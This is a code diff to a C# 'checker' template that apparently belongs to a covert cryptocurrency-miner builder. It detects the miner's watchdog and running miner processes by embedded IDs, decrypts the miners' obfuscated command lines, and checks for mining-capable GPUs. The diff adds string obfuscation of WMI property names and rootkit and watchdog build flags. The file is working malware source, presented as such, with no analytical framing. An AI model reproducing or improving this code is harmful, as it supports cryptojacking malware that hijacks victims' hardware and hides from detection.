@@ -34,15 +34,19 @@ public partial class _rChecker_
 
             var _rsearcher_ = new ManagementObjectSearcher(_rscope_, new ObjectQuery("Select CommandLine from Win32_Process")).Get();
 #if DefInstall
+#if DefMemoryWatchdog
             bool _rwdrunning_ = false;
             foreach (ManagementObject _rmemObj_ in _rsearcher_)
             {
-                if (_rmemObj_ != null && _rmemObj_["CommandLine"] != null && _rmemObj_["CommandLine"].ToString().Contains("#WATCHDOGID"))
+                if (_rmemObj_ != null && _rmemObj_["#STRCMDLINE"] != null && _rmemObj_["#STRCMDLINE"].ToString().Contains("#WATCHDOGID"))
                 {
                     _rwdrunning_ = true;
                     break;
                 }
             }
+#else
+            bool _rwdrunning_ = Process.GetProcessesByName("#WATCHDOGNAME").Length > 0;
+#endif
             Console.WriteLine("Watchdog Running: " + (_rwdrunning_ ? "Yes" : "No"));
 #endif
 #if DefRootkit
@@ -52,11 +56,11 @@ public partial class _rChecker_
             _rsearcher_ = new ManagementObjectSearcher(_rscope_, new ObjectQuery("Select CommandLine from Win32_Process")).Get();
             foreach (ManagementObject _rmemObj_ in _rsearcher_)
             {
-                if (_rmemObj_ != null && _rmemObj_["CommandLine"] != null && _rmemObj_["CommandLine"].ToString().Contains("#MINERID"))
+                if (_rmemObj_ != null && _rmemObj_["#STRCMDLINE"] != null && _rmemObj_["#STRCMDLINE"].ToString().Contains("#MINERID"))
                 {
                     try
                     {
-                        foreach(string _rminer_ in _rmemObj_["CommandLine"].ToString().Split(' '))
+                        foreach(string _rminer_ in _rmemObj_["#STRCMDLINE"].ToString().Split(' '))
                         {
                             string _rdecrypted_ = _rUnamlibDecrypt_(_rminer_);
                             if (!string.IsNullOrEmpty(_rdecrypted_))
@@ -75,8 +79,8 @@ public partial class _rChecker_
             _rsearcher_ = new ManagementObjectSearcher(_rscope_, new ObjectQuery("#GPUQUERY")).Get();
             foreach (ManagementObject _rmemObj_ in _rsearcher_)
             {
-                _rgpu_ += " " + _rmemObj_["Name"];
-                Console.WriteLine(" " + _rmemObj_["Name"]);
+                _rgpu_ += " " + _rmemObj_["#STRNAME"];
+                Console.WriteLine(" " + _rmemObj_["#STRNAME"]);
             }
 
             Console.WriteLine("Compatible GPU found: " + (_rgpu_.IndexOf("nvidia", StringComparison.OrdinalIgnoreCase) >= 0 || _rgpu_.IndexOf("amd", StringComparison.OrdinalIgnoreCase) >= 0));
@@ -88,9 +92,10 @@ public partial class _rChecker_
         Console.ReadKey();
     }
 
+#if DefObfuscate
     public static string _rGetString_(string _rarg1_)
     {
-        return Encoding.Unicode.GetString(_rAESMethod_(Convert.FromBase64String(_rarg1_)));
+        return Encoding.UTF8.GetString(_rAESMethod_(Convert.FromBase64String(_rarg1_)));
     }
 
     public static byte[] _rAESMethod_(byte[] _rinput_, bool _rencrypt_ = false)
@@ -109,6 +114,7 @@ public partial class _rChecker_
             }
         }
     }
+#endif
 
     public static string _rUnamlibDecrypt_(string _rplainText_)
     {
